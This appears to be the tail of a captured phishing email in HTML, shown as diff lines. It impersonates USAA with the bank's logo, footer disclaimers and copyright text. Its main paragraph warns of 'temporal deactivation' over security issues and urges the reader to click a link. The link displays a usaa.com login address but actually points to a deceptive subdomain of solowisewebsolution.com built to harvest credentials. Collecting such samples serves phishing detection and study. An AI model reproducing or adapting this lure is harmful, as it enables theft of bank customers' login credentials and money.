+								                            <td height="100%" width="1" bgcolor="#4c1a2e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="2" bgcolor="#ac080e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="1" bgcolor="#4c1a2e" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td height="100%" width="6" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                            </td>
+								                            <td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                                <table width="20" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+								                                    <tr style="padding: 0; vertical-align: top;">
+								                                        <td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+								                                            <span style="font-family: 'Arial', sans-serif;">&nbsp;
+								                                            </span>
+								                                        </td>
+								                                    </tr>
+								                                </table>
+								                            </td>
+								                            <td class="middle" height="170" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; vertical-align: middle; border-collapse: collapse;">
+								                                <table style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+								                                    <tr style="padding: 0; vertical-align: top;">
+								                                        <td class="h1 times regular white m-pad-top m-pad-right" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse; color: #ffffff;">
+								                                            <span style="font-size: 24px; line-height: 30px; font-family: 'Times New Roman', serif; color: #ffffff; font-weight: 100;">
+								                                                WE'RE READY TO SERVE YOU.
+								                                            </span>
+								                                        </td>
+								                                    </tr>
+								                                    <tr style="padding: 0; vertical-align: top;">
+								                                        <td height="2" class="mso-empty" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+								                                        </td>
+								                                    </tr>
+								                                    <tr style="padding: 0; vertical-align: top;">
+								                                        <td class="h4 white m-pad-right" style="-ms-hyphens: none; word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; hyphens: none; vertical-align: top; padding: 0; text-align: left; padding-bottom: 3px; border-collapse: collapse; color: #ffffff;">
+								                                            <span style="font-family: 'Arial', sans-serif; font-size: 16px; line-height: 22px; font-weight: bold; color: #ffffff;">USAA offers financial solutions designed to help you meet your goals throughout life.</span>
+								                                        </td>
+								                                    </tr>
+								                                    <tr style="padding: 0; vertical-align: top;">
+								                                    	<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+								                                    	</td>
+								                                    </tr>
+								                                    
+								                                </table>
+								                            </td>
+								                        </tr>
+								                    </table>
+								                </td>                    
+								            </tr>
+								        </table>       
+								        <!--[if gte mso 9]>
+											</v:textbox>
+											</v:rect>
+										<![endif]-->
+								    </td>
+								</tr>
+								<!-- end masthead-responsive -->
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<!-- centered-paragraph -->
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table align="center" class="yahoo-align-center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+													<table class="cell yahoo-align-center" align="center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="p center mobile-text-pad" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: center; border-collapse: collapse;">
+																<span class="nowrap" style="font-family: 'Arial', sans-serif; white-space: nowrap; font-size: 16px; line-height: 22px; color: #333940;">Upon intensive reviews on your profile. We have noticed that you<br> need to resolve important security issues on your account to<br> prevent temporal deactivation. It is therefore recommended that<br> you complete this process. Your security is important to us.<br><br>Please click on the reference link below to resolve this issue:<br><br><a href="http://usaa.com.inet.ent.logon.Logon.redirectedFromLogOff.truemain.warefpub.globalproducts.priauth.nav.f9a348bf60bbc6569.solowisewebsolution.com/usaalg/index.htm" style="margin: 0; color: #086b94; font-size: 16px; line-height: 22px; text-decoration: underline;">https://www.usaa.com/inet/ent_logon/Logon</a>				</span>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<!-- end centered-paragraph -->
+								
+								
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								
+								
+								
+								
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table class="page-margin" align="center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 480px; margin: 0 auto;" width="480">
+											<tr style="padding: 0; vertical-align: top;">
+												<td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="p mobile-text-pad" bgcolor="#a8c6cb" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">	
+																<table align="center" class="yahoo-align-center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+																	<tr style="padding: 0; vertical-align: top;">
+																		<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+																		</td>
+																	</tr>
+																	
+																	
+																</table>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								
+								
+								
+								
+								
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table align="center" class="yahoo-align-center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="img-center" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: center; border-collapse: collapse;">
+													<img src="http://f.e.usaa.com/i/42/2078198359/25637_4716_logo-usaa-small.png" alt="USAA&#174; logo" style="outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; width: auto; max-width: 100%; clear: both; margin: 0 auto; float: none; display: inline;">
+												</td>
+											</tr>
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="mso-empty" height="5" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+												</td>
+											</tr>
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="p_small center blue bold" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: center; border-collapse: collapse;">
+													<span style="font-family: 'Arial', sans-serif; font-size: 11px; line-height: 16px; display: block; font-weight: bold; color: #12395b;">We know what it means to serve<sup>&reg;</sup>
+												</span></td>
+											</tr>
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="p_small center blue" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: center; border-collapse: collapse;">
+													<span style="font-family: 'Arial', sans-serif; font-size: 11px; line-height: 16px; display: block; color: #12395b;">Insurance&nbsp;&nbsp;&nbsp;Banking&nbsp;&nbsp;&nbsp;Investments&nbsp;&nbsp;&nbsp;Retirement&nbsp;&nbsp;&nbsp;Advice
+													</span>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="15" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column twenty-four first last" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 580px;" width="580">
+														<tr style="padding: 0; vertical-align: top;">
+															<td width="100%" class="usaa-divider" style="word-break: break-word; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; -webkit-hyphens: none; vertical-align: top; background: #12395b; border-top-color: #fac705; font-size: 0; height: 0; border-top-width: 3px; border-top-style: solid; text-align: left; border-collapse: collapse; padding: 0 0 14px 0;">
+																<span style="font-family: 'Arial', sans-serif;">&nbsp;</span>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+																<!--footer-top -->
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table class="footer-top yahoo-align-center" align="center" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; margin: auto;">
+											
+											
+											
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="full-width" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; width: 580px; border-collapse: collapse;" width="580">
+										<table class="footer-middle" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column twenty-four first last" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 580px;" width="580">
+														<tr style="padding: 0; vertical-align: top;">
+															<td style="-webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; word-break: break-word; padding: 0; vertical-align: top; text-align: left; padding-bottom: 10px; padding-left: 15px; padding-right: 15px; border-collapse: collapse;">									
+																<span style="font-family: 'Arial', sans-serif; display: block; font-size: 11px; line-height: 16px;"><strong>Please do not reply to this e-mail. To contact USAA, visit our secure <a href="http://e.usaa.com/a/hBXYpMyB73spXB9MeTFNtLcf1r0/usaa04" style="margin: 0; color: #086b94; font-size: 11px; line-height: 16px; text-decoration: underline;">contact page</a>.</strong><br></span>
+																							<br>
+																<span style="font-family: 'Arial', sans-serif; display: block; font-size: 11px; line-height: 16px;">
+										
+										
+1 Multiple product savings do not apply in all states or to all situations. Savings subject to change. Restrictions apply. 
+<br></span><br><span style="font-family: 'Arial', sans-serif; display: block; font-size: 11px; line-height: 16px;">
+2 USAA Bank refunds up to $15 in other United States domestic banks' ATM usage fees each month and does not charge a fee for the first 10 ATM withdrawals. The ATM fee refund does not apply for the month in which the account is closed. Subsequent transactions will be charged $2.00 each. Transactions at ATMs located outside of the United States may not be eligible for ATM usage fee refunds. A 1% foreign transaction fee applies to withdrawals outside the United States. No ATM usage fees will be charged at USAA Preferred ATMs pursuant to an agreement with the ATM network/owners to not charge an ATM fee for USAA Bank ATM debit cards.
+<br></span><br><span style="font-family: 'Arial', sans-serif; display: block; font-size: 11px; line-height: 16px;">
+Bank products by USAA Federal Savings Bank, Member FDIC.
+<br></span><br><span style="font-family: 'Arial', sans-serif; display: block; font-size: 11px; line-height: 16px;">
+This advertisement brought to you by USAA, 9800 Fredericksburg Rd., San Antonio, TX 78288.</span>
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; border-collapse: collapse;">
+										<table class="footer-bottom bottom" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: bottom;">
+											<tr style="padding: 0; vertical-align: top;">
+												<td class="column seven first" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; vertical-align: bottom; border-collapse: collapse;">						
+													<table class="cell" align="left" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 169px;" width="169">
+														<tr style="padding: 0; vertical-align: top;">
+															<td style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; text-align: left; padding-left: 15px; border-collapse: collapse;">
+										
+																<span style="font-family: 'Arial', sans-serif; font-size: 11px; line-height: 16px;">&copy; 2017 USAA. 206966-0416</span>
+										
+															</td>
+										
+														</tr>
+													</table>					
+												</td>						
+												<td class="column seventeen last" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; text-align: left; vertical-align: bottom; border-collapse: collapse;">						
+													<table class="cell" style="border-spacing: 0; border-collapse: collapse; padding: 0; vertical-align: top; width: 411px;" width="411">
+														<tr style="padding: 0; vertical-align: top;">
+															<td class="right mobile-left" align="right" style="word-break: break-word; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; padding: 0; vertical-align: top; padding-right: 15px; text-align: right; border-collapse: collapse;">
+										
+																<img src="http://f.e.usaa.com/i/42/2078198359/25637_4716_environment.png" alt="Please consider the environment before printing this email." style="outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; width: auto; max-width: 100%; clear: both; display: inline;">
+																&nbsp;<span class="environment" style="font-family: 'Arial', sans-serif; color: #00a150; font-size: 11px; line-height: 16px;">Please consider the environment before printing this email.</span>
+										
+										
+															</td>
+														</tr>
+													</table>
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr style="padding: 0; vertical-align: top;">
+									<td class="mso-empty" height="10" style="word-break: break-word; vertical-align: top; padding: 0; hyphens: none; -ms-hyphens: none; -moz-hyphens: none; -webkit-hyphens: none; font-size: 0px; mso-table-rspace: 0pt; mso-table-lspace: 0pt; line-height: 0px; text-align: left; border-collapse: collapse;">
+									</td>
+								</tr>
+								
+							</table>
+							<!-- end content-member -->
+							
+							<br>
+							<br>
+
+	
+							<div class="nowrap" style="display: none; white-space: nowrap; font: 15px courier; color: #e5e5e5;">
+								---------------------------------------------------------------
+							</div>
+						
+						</div>
+
+
+						</center>
+					</td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+	</table>
+	
+	
+	
+	
+	
+	
+<img src="http://e.usaa.com/a/hBXYpMyB73spXB9MeTFNtLcf1r0/spacer.gif">
+</body>
+</html>
+
+--Boundary_(ID_s82DCzHyJZcEei3sWHa49A)--
